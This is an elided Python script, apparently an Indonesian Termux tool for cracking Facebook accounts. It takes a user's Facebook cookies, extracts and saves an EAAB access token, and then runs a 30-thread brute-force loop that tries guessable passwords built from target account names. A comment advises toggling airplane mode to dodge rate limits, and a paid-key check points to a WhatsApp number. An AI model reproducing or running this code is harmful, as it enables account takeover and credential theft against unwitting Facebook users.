	...
	try:
		...
		while True:
			...
			if rom in(""):
				...
				kukis = input(f"{P}?{H}.{P} Cookies :{K} ")
				ki = open('data/cookies','w').write(kukis)
				if len(kukis) == 0:
            ...
            'Cookie': kukis
				...
				with requests.Session() as r:
				  ...
				  for z in cari_id:
				    ...
				    romz = re.search('(EAAB\w+)', rex.text).group(1)
				    print(f"\n{M}#{P} Your token :{H} {romz}")
				    tkn = open('data/token.txt','w').write(romz)
				    print('')
				    print('[_^]LOGIN BERHASIL,SILAHKAN JALANKAN ULANG')
			elif rom in ('3', '03'):
				print (N)
				...
				if pwx == '':
					...
					def manual(brute=None):
						...
						if ind =='':
							...
							pp = '# Setiap crack 1k ID, nyalakan mode pesawat 2 detik'
							po = mark(pp,style="blue")
							sol().print(po);jeda(0.2)
			...
			with ThreadPoolExecutor(max_workers=30) as TitidNeverDie:
				for akun in self.id: 
					try:
						uid, name = akun.split('<=>')
						ss = name.split(' ')
						pwx = [ name, ss[0]+ss[1], ss[0]+"123", ss[0]+"12345", ss[0]+"1234", "sayang", "kontol", "anjing","bismillah","katasandi"]
...
def register_device():
	...
	while True:
		if os.path.exists("/data/data/com.termux/files/usr/etc/.license"):
			...
			check = requests.get("https://pastebin.com/5ViV9vaF")
			if key in check.text:
				...
				pr = '# SILAHKAN BELI KEY KE WA 083114591358'
				pu = mark(pr, style='red')
				cetak(nel(pu, title=" KEY ANDA BELUM DI KONFIRMASI"))
				os.system('xdg-open http://wa.me/+6283114591358')
